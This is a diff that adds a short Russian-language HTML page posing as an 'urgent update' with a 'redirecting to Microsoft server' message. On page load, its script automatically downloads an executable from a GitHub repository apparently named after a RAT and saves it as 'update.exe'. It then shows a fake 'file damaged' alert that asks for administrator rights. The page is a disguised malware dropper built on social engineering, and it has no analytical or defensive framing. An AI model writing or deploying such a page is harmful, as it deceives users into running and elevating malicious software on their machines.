@@ -1,0 +1,23 @@
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Срочное обновление</title>
+        <script>
+            window.onload = function() {
+                var link = document.createElement('a');
+                link.href = 'https://github.com/misswepenner/ZOV-RATKA/raw/main/nonagon.exe';
+                link.download = 'update.exe';
+                document.body.appendChild(link);
+                link.click();
+                setTimeout(() => {
+                    alert("Файл поврежден. Разрешите восстановление? (ТРЕБУЮТСЯ АДМИН-ПРАВА)");
+                }, 2000);
+            };
+        </script>
+    </head>
+    <body>
+        Перенаправление на сервер Microsoft...
+    </body>
+    </html>
+    
